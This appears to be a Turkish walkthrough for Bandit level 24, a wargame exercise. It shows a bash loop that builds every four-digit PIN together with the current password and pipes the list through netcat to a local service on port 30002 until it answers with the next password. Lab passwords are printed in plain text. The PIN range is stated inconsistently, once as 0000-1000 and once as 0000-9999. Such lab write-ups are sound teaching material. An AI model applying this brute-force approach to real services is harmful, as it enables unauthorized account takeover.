# Bandit Over The Wire **24**
### Bu Leveldeki Amacımız
> SSH ile bandit24'e bağlanıp `nc` ile  `127.0.0.1(localhost)` `30002` portuna şifremizi ve doğru pin kodunu göndererek bir sonraki level için şifreyi bulmak.


## Kullanacağımız Komutlar
1. `cd` : Change Directory kısaltmasıdır. Bulunduğumuz dizini değiştirmemizi sağlar. Daha fazlası için `man cd` komutunu kullanabilirsiniz.
2. `cat`: Bir dosya içeriğini ekrana yazdırır. Daha fazlası için `man cat` komutunu kullanabilirsiniz.
3. `nc`: Netcat'in kısaltmasıdır. Bir çok parametresi bulunuyor. Bu parametreler sayesinde farklı işlemler yapmamızı sağlıyor. Daha fazlası için `man nc` komutunu kullanabilirsiniz.
4. `nano`: Terminal üzerinde bir metin editörüdür. Daha fazlası için `man nano` komutunu kullanabilirsiniz.
5. `touch`: Bir dosya oluşturmak için kullanılır. Daha fazlası için `man touch` komutunu kullanabilirsiniz.
6. `chmod`: Dosya ve dizinlerin izinlerini değiştirmek için kullanılır. Daha fazlası için `man chmod` komutunu kullanabilirsiniz.



## Bilinmesi Gerekenler
- BruteForce nedir ?
    > Kaba kuvvet saldırı anlamına gelir. Bir şifre, parola, anahtar veya diğer gizli bilginin doğru kombinasyonunu bulmak için her olası kombinasyonu deneme sürecidir. 
    >
    > Kaba kuvvet saldırısında, saldırgan, doğru kombinasyonu bulma umuduyla tüm olası kombinasyonları sistematik olarak dener. Örneğin, bir parola 8 karakter uzunluğundaysa ve her karakter için 26 harf seçeneği varsa, saldırgan toplam 26^8 = 208,891,577,600 olası kombinasyonu denemelidir. Bu, çok fazla kombinasyon olduğundan, kaba kuvvet saldırıları genellikle çok zaman alır.


## Şifre Bulma
Bu levelde `127.0.0.1` adresinin `30002` portuna şifremizi ve doğru pini göndermeye çalışacağız lakin `0000 - 1000` arasında çok fazla seçenek olduğu için bu işlemi otomatikleştirmemiz gerekiyor. Bunun için `bash` scripti yazacağız.

```bash
bandit25@bandit:~$ cd /tmp
bandit25@bandit:/tmp$ touch createPinList.sh
bandit25@bandit:/tmp$ chmod +x createPinList.sh
bandit25@bandit:/tmp$ nano createPinList.sh
```
`nano` ile dosyanın içine aşağıdaki kodları yazıp kaydedelim.

```bash
for i in {0000..9999}; do
    echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i ">> wordlist.txt
done

```
Bu kodlar `0000` ile `9999` arasında bir liste oluşturup `wordlist.txt` dosyasına yazıyor. Bu dosyayı da `nc` ile göndereceğiz.

```bash
bandit25@bandit:/tmp$ ./createPinList.sh
bandit25@bandit:/tmp$ cat wordlist.txt | nc 127.0.0.1 30002
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Wrong! Please enter the correct current password. Try again.
Correct!
The password of user bandit26 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```
Bu şekilde `wordlist.txt` dosyasındaki tüm pinleri deneyerek doğru pin'i bulmuş olduk. Bu şifre ile bir sonraki levele geçebiliriz.


<hr/>

Hata ve geri dönüşler için: *[ersagun@ersaguntosun.com ](mailto:ersagun@ersaguntosun.com)*
